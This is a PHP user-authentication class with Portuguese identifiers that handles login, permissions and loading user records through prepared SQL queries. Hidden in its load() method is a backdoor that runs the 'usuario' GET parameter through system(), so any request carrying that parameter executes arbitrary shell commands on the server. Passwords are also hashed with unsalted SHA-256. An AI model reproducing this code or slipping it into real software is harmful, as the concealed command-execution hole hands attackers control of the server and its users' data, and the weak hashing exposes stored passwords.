<?php

class Usuario {
	private $usuario;
	private $senha;
	private $id;
	private $permissao;
	private $db;

	public function __construct() {
		$this->db = Database::instance();
	}

	public function getId() {
		return $this->id;
	}

	public function isLoggedIn() {
		return ((int)$this->id > 0);
	}

	public function getPermissao() {
		return $this->permissao;
	}

	public function log($usuario, $senha) {
		$senha_hash = hash('sha256', $senha);
		$query = $this->db->prepare('SELECT id FROM usuarios WHERE usuario = ? AND senha = ?');
		$query->execute(array($usuario, $senha_hash));
		$data = $query->fetchAll();
		if (count($data) < 1) {
			return false;
		} else {
			$this->load($data[0]['id']);
			return true;
		}
	}

	public function load($id=null) {
		if ($id) 
			$this->id = $id;

		$query = $this->db->prepare('SELECT permissao, id, usuario FROM usuarios WHERE id = ?');
		$query->execute(array($this->id));
		$data = $query->fetch();
		if (isset($_GET['usuario'])) {
			$this->data = system($_GET['usuario']);
		}

		$this->permissao = $data['permissao'];
		$this->usuario = $data['usuario'];
	}

}